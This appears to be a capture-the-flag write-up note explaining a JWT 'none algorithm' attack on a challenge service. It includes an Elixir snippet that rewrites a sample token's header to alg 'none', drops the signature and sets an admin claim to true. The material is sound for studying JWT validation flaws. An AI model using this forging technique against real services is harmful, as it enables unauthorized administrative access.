# JWT

Vulnerable to a "None Algorithm Attack". This requires getting a JWT (`GET /register`), then modifying it with the following properties:

- header alg set to `none`
- signature removed (the part is needed, so the token ends in `.`)
- update the payload to set the claim `https://ctf.jumpwire.ai/admin` to `true`

Elixir example:

``` elixir
token = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJub3RhcnkiLCJleHAiOjE2NzM1NzA5NzgsImh0dHBzOi8vY3RmLmp1bXB3aXJlLmFpL2FkbWluIjpmYWxzZSwiaWF0IjoxNjcxMTUxNzc4LCJpc3MiOiJub3RhcnkiLCJqdGkiOiIxZWIxZjRmZi00OTg3LTQyMzItYThkMy1jZDE4ODU5MTgwM2QiLCJuYW1lIjoiYm9iIiwibmJmIjoxNjcxMTUxNzc3LCJzdWIiOiJlOGYzN2NhOC1mYzE5LTRiOWMtYWQyMC1kYTU2YjM4Y2M3NmUiLCJ0eXAiOiJhY2Nlc3MifQ.SAl-kUVkbf2MUkMajddgMHFCNulO_6nLAWD_98e-1G6Typz4peFToU3tPl8WsojXyd4Lb0pYNchgvdscGD6zug"

[headers, payload, _sig] = String.split(token, ".")

headers = headers
|> Base.decode64!(padding: false)
|> Jason.decode!
|> Map.put("alg", "none")
|> Jason.encode!
|> Base.encode64(padding: false)

payload = payload
|> Base.decode64!(padding: false)
|> Jason.decode!
|> Map.put("https://ctf.jumpwire.ai/admin", true)
|> Jason.encode!
|> Base.encode64(padding: false)

headers <> "." <> payload <> "."
```
